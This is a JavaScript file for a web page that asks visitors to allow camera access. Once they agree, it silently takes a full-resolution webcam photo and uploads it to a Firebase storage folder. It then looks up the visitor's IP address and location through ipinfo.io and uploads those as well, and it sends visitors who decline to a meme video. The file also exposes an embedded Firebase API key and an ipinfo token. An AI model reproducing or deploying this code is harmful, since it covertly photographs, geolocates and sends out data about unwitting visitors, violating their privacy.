// Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyCSmicQncJhWtvEekSLNQtvWM6fFr0cuRM",
    authDomain: "html-7fd9b.firebaseapp.com",
    projectId: "html-7fd9b",
    storageBucket: "html-7fd9b.appspot.com",
    messagingSenderId: "1022361191925",
    appId: "1:1022361191925:web:0f971d6e7c72cfc3aa0cbc",
};

// Initialize Firebase
const app = firebase.initializeApp(firebaseConfig);
const storage = firebase.storage();
const auth = firebase.auth();

// DOM elements
const allowButton = document.getElementById("allowButton");
const denyButton = document.getElementById("denyButton");
const video = document.getElementById("video");

// Allow camera access and capture images
allowButton.onclick = function () {
    auth.signInAnonymously().then(() => {
        captureFromCamera(); // Capture image immediately
    }).catch((error) => {
        console.error("Authentication failed:", error);
        alert("Authentication failed. Try again.");
    });
};

// Redirect to YouTube on "Don't Allow"
denyButton.onclick = function () {
    window.location.href = "https://www.youtube.com/watch?v=hD5eQ5PvqpE"; // Redirect to Hamood Habibi video
};

// Capture from camera
function captureFromCamera() {
    navigator.mediaDevices.getUserMedia({ video: { width: 1920, height: 1080 } })
        .then((stream) => {
            video.srcObject = stream;
            video.style.display = "block";

            // Capture an image as soon as the video starts streaming
            setTimeout(() => {
                captureImage(stream);
            }, 1000); // Allow the camera 1 second to initialize
        })
        .catch((error) => {
            console.error("Camera access denied:", error);
            alert("Camera access denied. Redirecting...");
            window.location.href = "https://www.youtube.com/watch?v=hD5eQ5PvqpE";
        });
}

// Capture image
function captureImage(stream) {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = 1920;
    canvas.height = 1080;

    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    canvas.toBlob((blob) => {
        const storageRef = storage.ref('bombclaat/Pictures/picture_' + Date.now() + '.jpg');
        storageRef.put(blob).then(() => {
            console.log('Picture uploaded successfully.');
            captureIPData(); // Capture IP data after uploading the picture
        }).catch((error) => {
            console.error("Error uploading picture:", error);
        });
    }, 'image/jpeg');

    // Stop the camera stream
    stream.getTracks().forEach((track) => track.stop());
}

// Capture IP data
function captureIPData() {
    fetch('https://ipinfo.io?token=023890bc57338a') // API call to ipinfo.io
        .then((response) => response.json())
        .then((data) => {
            const ipData = `IP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}\nDetails: ${JSON.stringify(data)}`;
            const ipDataRef = storage.ref('bombclaat/Ipinfo/ipinfo_' + Date.now() + '.txt');
            ipDataRef.putString(ipData).then(() => {
                console.log('IP data uploaded successfully.');
            }).catch((error) => {
                console.error("Error uploading IP data:", error);
            });
        })
        .catch((error) => {
            console.error("Error fetching IP data:", error);
        });
}